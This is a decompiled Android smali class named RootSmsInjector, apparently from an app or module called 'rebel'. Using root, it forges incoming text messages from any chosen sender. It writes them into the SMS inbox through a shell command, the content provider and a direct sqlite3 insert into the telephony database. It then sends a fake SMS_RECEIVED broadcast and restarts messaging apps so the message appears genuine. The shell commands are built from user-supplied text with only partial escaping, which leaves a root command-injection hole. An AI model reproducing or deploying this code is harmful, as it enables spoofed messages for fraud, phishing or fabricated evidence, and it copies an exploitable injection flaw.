.class public Lcom/rebel/module/RootSmsInjector;
.super Ljava/lang/Object;
.source "RootSmsInjector.java"


# static fields
.field private static final TAG:Ljava/lang/String; = "RootSmsInjector"


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 17
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method private static findSmsDbPath()Ljava/lang/String;
    .locals 12

    .line 157
    const/4 v0, 0x3

    new-array v1, v0, [Ljava/lang/String;

    const-string v2, "/data/data/com.android.providers.telephony/databases/mmssms.db"

    const/4 v3, 0x0

    aput-object v2, v1, v3

    const-string v2, "/data/data/com.android.providers.telephony/databases/telephony.db"

    const/4 v4, 0x1

    aput-object v2, v1, v4

    const-string v2, "/data/user_de/0/com.android.providers.telephony/databases/mmssms.db"

    const/4 v5, 0x2

    aput-object v2, v1, v5

    .line 163
    .local v1, "possiblePaths":[Ljava/lang/String;
    array-length v2, v1

    move v6, v3

    :goto_0
    if-ge v6, v2, :cond_1

    aget-object v7, v1, v6

    .line 165
    .local v7, "path":Ljava/lang/String;
    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v8

    new-array v9, v0, [Ljava/lang/String;

    const-string v10, "su"

    aput-object v10, v9, v3

    const-string v10, "-c"

    aput-object v10, v9, v4

    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    const-string v11, "test -f "

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, " && echo OK"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    aput-object v10, v9, v5

    invoke-virtual {v8, v9}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v8

    .line 166
    .local v8, "process":Ljava/lang/Process;
    new-instance v9, Ljava/io/BufferedReader;

    new-instance v10, Ljava/io/InputStreamReader;

    .line 167
    invoke-virtual {v8}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;

    move-result-object v11

    invoke-direct {v10, v11}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v9, v10}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 168
    .local v9, "reader":Ljava/io/BufferedReader;
    invoke-virtual {v9}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v10

    .line 169
    .local v10, "result":Ljava/lang/String;
    const-string v11, "OK"

    invoke-virtual {v11, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    if-eqz v11, :cond_0

    .line 171
    return-object v7

    .line 175
    .end local v8    # "process":Ljava/lang/Process;
    .end local v9    # "reader":Ljava/io/BufferedReader;
    .end local v10    # "result":Ljava/lang/String;
    :cond_0
    goto :goto_1

    .line 173
    :catch_0
    move-exception v8

    .line 163
    .end local v7    # "path":Ljava/lang/String;
    :goto_1
    add-int/lit8 v6, v6, 0x1

    goto :goto_0

    .line 177
    :cond_1
    const/4 v0, 0x0

    return-object v0
.end method

.method public static hasRoot()Z
    .locals 4

    .line 223
    const/4 v0, 0x0

    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v1

    const-string v2, "su"

    invoke-virtual {v1, v2}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v1

    .line 224
    .local v1, "process":Ljava/lang/Process;
    new-instance v2, Ljava/io/DataOutputStream;

    invoke-virtual {v1}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    .line 225
    .local v2, "os":Ljava/io/DataOutputStream;
    const-string v3, "exit\n"

    invoke-virtual {v2, v3}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 226
    invoke-virtual {v2}, Ljava/io/DataOutputStream;->flush()V

    .line 227
    invoke-virtual {v1}, Ljava/lang/Process;->waitFor()I

    move-result v3
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 228
    .local v3, "exitCode":I
    if-nez v3, :cond_0

    const/4 v0, 0x1

    :cond_0
    return v0

    .line 229
    .end local v1    # "process":Ljava/lang/Process;
    .end local v2    # "os":Ljava/io/DataOutputStream;
    .end local v3    # "exitCode":I
    :catch_0
    move-exception v1

    .line 230
    .local v1, "e":Ljava/lang/Exception;
    return v0
.end method

.method public static injectSms(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z
    .locals 6
    .param p0, "context"    # Landroid/content/Context;
    .param p1, "sender"    # Ljava/lang/String;
    .param p2, "message"    # Ljava/lang/String;

    .line 25
    const/4 v0, 0x0

    :try_start_0
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    .line 34
    .local v1, "timestamp":J
    invoke-static {p1, p2, v1, v2}, Lcom/rebel/module/RootSmsInjector;->injectViaContentCommand(Ljava/lang/String;Ljava/lang/String;J)Z

    move-result v3

    .line 38
    .local v3, "method1":Z
    invoke-static {p0, p1, p2, v1, v2}, Lcom/rebel/module/RootSmsInjector;->injectViaContentProvider(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;J)Z

    move-result v4

    .line 42
    .local v4, "method2":Z
    invoke-static {p1, p2, v1, v2}, Lcom/rebel/module/RootSmsInjector;->injectViaSQLite(Ljava/lang/String;Ljava/lang/String;J)Z

    move-result v5

    .line 46
    .local v5, "method3":Z
    invoke-static {p0, p1, p2}, Lcom/rebel/module/RootSmsInjector;->triggerNotification(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 48
    if-nez v3, :cond_0

    if-nez v4, :cond_0

    if-eqz v5, :cond_1

    :cond_0
    const/4 v0, 0x1

    .line 53
    .local v0, "success":Z
    :cond_1
    return v0

    .line 54
    .end local v0    # "success":Z
    .end local v1    # "timestamp":J
    .end local v3    # "method1":Z
    .end local v4    # "method2":Z
    .end local v5    # "method3":Z
    :catch_0
    move-exception v1

    .line 56
    .local v1, "e":Ljava/lang/Exception;
    return v0
.end method

.method private static injectViaContentCommand(Ljava/lang/String;Ljava/lang/String;J)Z
    .locals 8
    .param p0, "sender"    # Ljava/lang/String;
    .param p1, "message"    # Ljava/lang/String;
    .param p2, "timestamp"    # J

    .line 67
    const-string v0, "\'\\\'\'"

    const-string v1, "\'"

    const/4 v2, 0x0

    :try_start_0
    invoke-virtual {p0, v1, v0}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    .line 68
    .local v3, "escapedSender":Ljava/lang/String;
    invoke-virtual {p1, v1, v0}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    .line 70
    .local v0, "escapedMessage":Ljava/lang/String;
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "content insert --uri content://sms/inbox --bind address:s:\'"

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v4, "\' --bind body:s:\'"

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v4, "\' --bind date:i:"

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p2, p3}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v4, " --bind date_sent:i:"

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p2, p3}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v4, " --bind read:i:0 --bind type:i:1 --bind seen:i:0 --bind status:i:-1"

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 80
    .local v1, "cmd":Ljava/lang/String;
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v4

    const/4 v5, 0x3

    new-array v5, v5, [Ljava/lang/String;

    const-string v6, "su"

    aput-object v6, v5, v2

    const-string v6, "-c"

    const/4 v7, 0x1

    aput-object v6, v5, v7

    const/4 v6, 0x2

    aput-object v1, v5, v6

    invoke-virtual {v4, v5}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v4

    .line 81
    .local v4, "process":Ljava/lang/Process;
    invoke-virtual {v4}, Ljava/lang/Process;->waitFor()I

    move-result v5
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 84
    .local v5, "exitCode":I
    if-nez v5, :cond_0

    move v2, v7

    :cond_0
    return v2

    .line 85
    .end local v0    # "escapedMessage":Ljava/lang/String;
    .end local v1    # "cmd":Ljava/lang/String;
    .end local v3    # "escapedSender":Ljava/lang/String;
    .end local v4    # "process":Ljava/lang/Process;
    .end local v5    # "exitCode":I
    :catch_0
    move-exception v0

    .line 87
    .local v0, "e":Ljava/lang/Exception;
    return v2
.end method

.method private static injectViaContentProvider(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;J)Z
    .locals 6
    .param p0, "context"    # Landroid/content/Context;
    .param p1, "sender"    # Ljava/lang/String;
    .param p2, "message"    # Ljava/lang/String;
    .param p3, "timestamp"    # J

    .line 96
    const/4 v0, 0x0

    :try_start_0
    new-instance v1, Landroid/content/ContentValues;

    invoke-direct {v1}, Landroid/content/ContentValues;-><init>()V

    .line 97
    .local v1, "values":Landroid/content/ContentValues;
    const-string v2, "address"

    invoke-virtual {v1, v2, p1}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 98
    const-string v2, "body"

    invoke-virtual {v1, v2, p2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 99
    const-string v2, "date"

    invoke-static {p3, p4}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Long;)V

    .line 100
    const-string v2, "date_sent"

    invoke-static {p3, p4}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Long;)V

    .line 101
    const-string v2, "read"

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 102
    const-string v2, "type"

    const/4 v3, 0x1

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    invoke-virtual {v1, v2, v4}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 103
    const-string v2, "seen"

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    invoke-virtual {v1, v2, v4}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 104
    const-string v2, "status"

    const/4 v4, -0x1

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-virtual {v1, v2, v5}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 105
    const-string v2, "sub_id"

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    invoke-virtual {v1, v2, v4}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 107
    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    const-string v4, "content://sms/inbox"

    .line 108
    invoke-static {v4}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v4

    .line 107
    invoke-virtual {v2, v4, v1}, Landroid/content/ContentResolver;->insert(Landroid/net/Uri;Landroid/content/ContentValues;)Landroid/net/Uri;

    move-result-object v2
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 110
    .local v2, "uri":Landroid/net/Uri;
    if-eqz v2, :cond_0

    move v0, v3

    .line 111
    .local v0, "success":Z
    :cond_0
    nop

    .line 114
    return v0

    .line 115
    .end local v0    # "success":Z
    .end local v1    # "values":Landroid/content/ContentValues;
    .end local v2    # "uri":Landroid/net/Uri;
    :catch_0
    move-exception v1

    .line 117
    .local v1, "e":Ljava/lang/Exception;
    return v0
.end method

.method private static injectViaSQLite(Ljava/lang/String;Ljava/lang/String;J)Z
    .locals 10
    .param p0, "sender"    # Ljava/lang/String;
    .param p1, "message"    # Ljava/lang/String;
    .param p2, "timestamp"    # J

    .line 127
    const-string v0, "\'\'"

    const-string v1, "\'"

    const/4 v2, 0x0

    :try_start_0
    invoke-static {}, Lcom/rebel/module/RootSmsInjector;->findSmsDbPath()Ljava/lang/String;

    move-result-object v3

    .line 128
    .local v3, "dbPath":Ljava/lang/String;
    if-nez v3, :cond_0

    .line 130
    return v2

    .line 133
    :cond_0
    invoke-virtual {p0, v1, v0}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v4

    .line 134
    .local v4, "escapedSender":Ljava/lang/String;
    invoke-virtual {p1, v1, v0}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    .line 136
    .local v0, "escapedMessage":Ljava/lang/String;
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "INSERT INTO sms (address, body, date, date_sent, read, type, seen, status) VALUES (\'"

    invoke-virtual {v1, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v5, "\', \'"

    invoke-virtual {v1, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v5, "\', "

    invoke-virtual {v1, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p2, p3}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v5, ", "

    invoke-virtual {v1, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p2, p3}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v5, ", 0, 1, 0, -1);"

    invoke-virtual {v1, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 140
    .local v1, "sql":Ljava/lang/String;
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "sqlite3 "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, " \""

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "\""

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 142
    .local v5, "cmd":Ljava/lang/String;
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v6

    const/4 v7, 0x3

    new-array v7, v7, [Ljava/lang/String;

    const-string v8, "su"

    aput-object v8, v7, v2

    const-string v8, "-c"

    const/4 v9, 0x1

    aput-object v8, v7, v9

    const/4 v8, 0x2

    aput-object v5, v7, v8

    invoke-virtual {v6, v7}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v6

    .line 143
    .local v6, "process":Ljava/lang/Process;
    invoke-virtual {v6}, Ljava/lang/Process;->waitFor()I

    move-result v7
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 146
    .local v7, "exitCode":I
    if-nez v7, :cond_1

    move v2, v9

    :cond_1
    return v2

    .line 147
    .end local v0    # "escapedMessage":Ljava/lang/String;
    .end local v1    # "sql":Ljava/lang/String;
    .end local v3    # "dbPath":Ljava/lang/String;
    .end local v4    # "escapedSender":Ljava/lang/String;
    .end local v5    # "cmd":Ljava/lang/String;
    .end local v6    # "process":Ljava/lang/Process;
    .end local v7    # "exitCode":I
    :catch_0
    move-exception v0

    .line 149
    .local v0, "e":Ljava/lang/Exception;
    return v2
.end method

.method private static triggerNotification(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 18
    .param p0, "context"    # Landroid/content/Context;
    .param p1, "sender"    # Ljava/lang/String;
    .param p2, "message"    # Ljava/lang/String;

    .line 186
    const-string v1, "-c"

    const-string v2, "su"

    :try_start_0
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v3, "content://sms"

    invoke-static {v3}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v3

    const/4 v4, 0x0

    invoke-virtual {v0, v3, v4}, Landroid/content/ContentResolver;->notifyChange(Landroid/net/Uri;Landroid/database/ContentObserver;)V

    .line 187
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v3, "content://sms/inbox"

    invoke-static {v3}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v3

    invoke-virtual {v0, v3, v4}, Landroid/content/ContentResolver;->notifyChange(Landroid/net/Uri;Landroid/database/ContentObserver;)V

    .line 190
    new-instance v0, Landroid/content/Intent;

    const-string v3, "android.provider.Telephony.SMS_RECEIVED"

    invoke-direct {v0, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    move-object v3, v0

    .line 191
    .local v3, "intent":Landroid/content/Intent;
    const-string v0, "address"
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_6

    move-object/from16 v4, p1

    :try_start_1
    invoke-virtual {v3, v0, v4}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 192
    const-string v0, "body"
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_5

    move-object/from16 v5, p2

    :try_start_2
    invoke-virtual {v3, v0, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_4

    .line 193
    move-object/from16 v6, p0

    :try_start_3
    invoke-virtual {v6, v3}, Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V

    .line 196
    const/4 v7, 0x3

    new-array v0, v7, [Ljava/lang/String;

    const-string v8, "com.android.mms"

    const/4 v9, 0x0

    aput-object v8, v0, v9

    const-string v8, "com.google.android.apps.messaging"

    const/4 v10, 0x1

    aput-object v8, v0, v10

    const-string v8, "com.miui.mms"

    const/4 v11, 0x2

    aput-object v8, v0, v11

    move-object v8, v0

    .line 202
    .local v8, "messagingPackages":[Ljava/lang/String;
    array-length v12, v8

    move v13, v9

    :goto_0
    if-ge v13, v12, :cond_0

    aget-object v0, v8, v13
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    move-object v14, v0

    .line 204
    .local v14, "pkg":Ljava/lang/String;
    :try_start_4
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v0

    new-array v15, v7, [Ljava/lang/String;

    aput-object v2, v15, v9

    aput-object v1, v15, v10
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    move/from16 v16, v9

    :try_start_5
    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_1

    move/from16 v17, v10

    :try_start_6
    const-string v10, "am force-stop "

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    aput-object v9, v15, v11

    invoke-virtual {v0, v15}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;

    .line 205
    const-wide/16 v9, 0x1f4

    invoke-static {v9, v10}, Ljava/lang/Thread;->sleep(J)V

    .line 206
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v0

    new-array v9, v7, [Ljava/lang/String;

    aput-object v2, v9, v16

    aput-object v1, v9, v17

    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    const-string v15, "am start-service "

    invoke-virtual {v10, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    aput-object v10, v9, v11

    invoke-virtual {v0, v9}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_0

    .line 209
    goto :goto_2

    .line 207
    :catch_0
    move-exception v0

    goto :goto_2

    :catch_1
    move-exception v0

    goto :goto_1

    :catch_2
    move-exception v0

    move/from16 v16, v9

    :goto_1
    move/from16 v17, v10

    .line 202
    .end local v14    # "pkg":Ljava/lang/String;
    :goto_2
    add-int/lit8 v13, v13, 0x1

    move/from16 v9, v16

    move/from16 v10, v17

    goto :goto_0

    .line 215
    .end local v3    # "intent":Landroid/content/Intent;
    .end local v8    # "messagingPackages":[Ljava/lang/String;
    :cond_0
    goto :goto_4

    .line 213
    :catch_3
    move-exception v0

    goto :goto_4

    :catch_4
    move-exception v0

    move-object/from16 v6, p0

    goto :goto_4

    :catch_5
    move-exception v0

    move-object/from16 v6, p0

    goto :goto_3

    :catch_6
    move-exception v0

    move-object/from16 v6, p0

    move-object/from16 v4, p1

    :goto_3
    move-object/from16 v5, p2

    .line 216
    :goto_4
    return-void
.end method
